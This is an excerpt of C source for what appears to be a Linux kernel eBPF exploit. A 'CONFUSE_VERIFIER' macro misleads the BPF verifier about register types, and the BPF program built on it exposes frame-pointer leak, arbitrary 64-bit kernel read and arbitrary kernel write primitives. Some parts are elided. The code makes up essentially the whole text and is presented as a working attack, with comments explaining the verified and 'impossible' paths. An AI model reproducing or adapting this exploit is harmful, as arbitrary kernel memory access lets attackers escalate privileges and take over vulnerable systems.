...
#define CONFUSE_VERIFIER()                                                     \
  /* r0 = &cmd; */                                                             \
  BPF_MOV64_REG(BPF_REG_0, BPF_REG_7),                                         \
  /* r0 = SCALAR_VALUE &cmd (auth_map == 1) */                                 \
  BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),                                        \
  /* r0 = SCALAR_VALUE 0 (auth_map == 1) */                                    \
  BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_0),                                \
  /* r0 = PTR_TO_MAP_VALUE 0 */                                                \
  BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),                                        \
  /* if (r0 != NULL) return 0; */                                              \
...
static void prep(void) {
  ...
  struct bpf_insn prog[] = {
      ...
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, GET_FP, 3),
      /* if (r0 == READ_U64) goto read_u64; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, READ_U64, 14),
      /* if (r0 == WRITE_U64) goto write_u64; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, WRITE_U64, 26),
      /* return r0; */
      BPF_EXIT_INSN(),
      ...
      /* if (r8 == BOGUS_ADDR) goto get_fp_verifier_off; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_8, BOGUS_ADDR, 8),
      /* r6 = r10; */
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_10),
      CONFUSE_VERIFIER(),
      /* get_fp_verifier_off: */
      /* val = r6;
       * r6 == 0 on the verified path
       * r6 == fp on the "impossible" path */
      BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_6, 0),
      BPF_EXIT_INSN(),

      /* read_u64: */
      /* r6 = r7; */
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_7),
      /* if (r8 == BOGUS_ADDR) goto read_u64_verifier_off; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_8, BOGUS_ADDR, 8),
      /* r6 = r8; */
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
      CONFUSE_VERIFIER(),
      /* read_u64_verifier_off: */
      /* val = *r6;
       * r6 == &cmd on the verified path
       * r6 == addr on the "impossible" path */
      ...
      /* r6 = r7; */
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_7),
      /* if (r8 == BOGUS_ADDR) goto write_u64_verifier_off; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_8, BOGUS_ADDR, 8),
      /* r6 = r8; */
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
      CONFUSE_VERIFIER(),
      /* write_u64_verifier_off: */
      /* *r6 = *r9;
       * r6 == &cmd on the verified path
       * r6 == addr on the "impossible" path */
      BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_9, 0),
      BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0),
      BPF_EXIT_INSN(),
  };
...
static uint64_t call_prog(int cmd, uint64_t addr, uint64_t val) {
  ...
  int key = 2;
  uint64_t result = 0xdeadbeefdeadbeefull;
